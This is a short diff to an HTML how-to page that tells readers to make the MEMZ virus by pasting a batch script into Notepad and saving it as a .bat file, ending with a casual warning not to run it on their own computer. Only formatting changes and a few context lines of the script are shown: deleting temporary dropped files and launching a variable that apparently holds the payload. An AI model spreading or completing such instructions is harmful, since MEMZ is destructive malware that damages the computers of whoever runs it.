@@ -6,8 +6,8 @@ MEMZ was originally created by Leurak for YouTuber danooct1's Viewer-Made Malwar
   <br><br>
   
 
-  1) To make the memz virus first you need to open notepad and enter th folllowing code:
-  <fiedset>
+ <b><i> 1) To make the memz virus first you need to open notepad and enter th folllowing code:<i></b>
+
    
 @echo off
  
@@ -178,8 +178,8 @@ del x.js >NUL 2>NUL
 del z.zip >NUL 2>NUL
 del x >NUL 2>NUL
 start "" %v%
-</fieldset>
+
 <br><br>
-2) After you have pasted the code save it as a .bat file ( filename.bat )
+<b><i>2) After you have pasted the code save it as a .bat file ( filename.bat )</i></b>
 <br><br>
-3) Be carefull with the viru and don't accidently use it on your computer
+  <b><i>3) Be carefull with the viru and don't accidently use it on your computer</i></b>
